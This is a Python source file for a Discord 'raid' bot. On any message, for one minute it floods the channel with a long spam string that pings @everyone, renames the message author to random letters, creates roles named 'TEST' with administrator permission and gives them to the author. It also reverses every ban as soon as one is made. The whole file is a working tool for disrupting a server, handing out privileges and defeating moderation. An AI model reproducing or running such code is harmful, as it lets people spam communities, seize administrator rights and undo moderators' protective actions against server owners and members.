import os
import discord
import time
import random
import string
from discord.utils import get

TOKEN = ('INSERT TOKEN HERE')

client=discord.Client()
q=0

@client.event
async def on_ready():
    print('connected to Discord!')
    
x=int(time.time())

@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)

@client.event
async def on_message(message):
    response = 'reeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee @everyone'
    global x
    while int(time.time())+0<x+60:
        global q
        print(q)
        q=q+1
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            user=message.author
            await user.edit(nick=str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters)))
        except:
            print("can't change user nick")
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            await guild.create_role(name='TEST', colour=discord.Colour(0x0000FF),permissions=perms)
        except:
            print('maximum roles reached error')
            pass
        user=message.author
        role=get(guild.roles,name='TEST')
        await user.add_roles(role)
client.run(TOKEN)